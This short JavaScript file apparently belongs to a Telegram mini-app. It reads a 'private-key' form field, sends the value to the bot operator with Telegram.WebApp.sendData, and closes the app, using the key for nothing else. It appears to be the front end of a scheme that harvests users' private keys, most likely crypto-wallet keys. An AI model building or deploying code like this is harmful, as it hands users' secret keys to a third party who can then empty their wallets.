window.addEventListener('DOMContentLoaded', () => {
  if (window.Telegram && Telegram.WebApp) {
    try {
      Telegram.WebApp.ready();
      // Optionally expand to full height on mobile
      // Telegram.WebApp.expand();
    } catch (e) {
      // no-op
    }
  }

  const form = document.getElementById('private-key-form');
  form.addEventListener('submit', function (event) {
    event.preventDefault();
    const privateKey = document.getElementById('private-key').value.trim();
    if (!privateKey) return;
    try {
      Telegram.WebApp.sendData(privateKey);
    } finally {
      if (Telegram && Telegram.WebApp && typeof Telegram.WebApp.close === 'function') {
        // Close the Web App so control returns to the chat after submission
        Telegram.WebApp.close();
      }
    }
  });
});
